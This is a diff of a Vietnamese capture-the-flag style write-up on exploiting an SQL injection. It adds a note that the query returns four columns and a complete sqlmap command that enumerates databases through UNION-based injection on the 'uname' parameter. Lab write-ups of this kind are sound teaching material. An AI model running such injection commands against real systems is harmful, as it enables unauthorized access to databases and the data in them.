@@ -62,4 +62,8 @@ Giờ mình khai thác lỗ hỏng này tuần tự, do đề bài không cho th
 ![[Pasted image 20261013153419.png]]
 => Có tổng cộng 4 cột trả về.
 
-Mình test một lúc thì nhận ra sức người khó mà đoán được kiểu dữ liệu từng cột, nên mình mày mò nhờ AI chỉ cách dùng to
+Mình test một lúc thì nhận ra sức người khó mà đoán được kiểu dữ liệu từng cột, nên mình mày mò nhờ AI chỉ cách dùng tool SQLMap để automate:D :
+```bash
+python sqlmap.py -r req.txt --batch --dbs --force-ssl --random-agent \
+  -p uname --technique=U --union-cols=4 --string="home.php" -v 3
+```
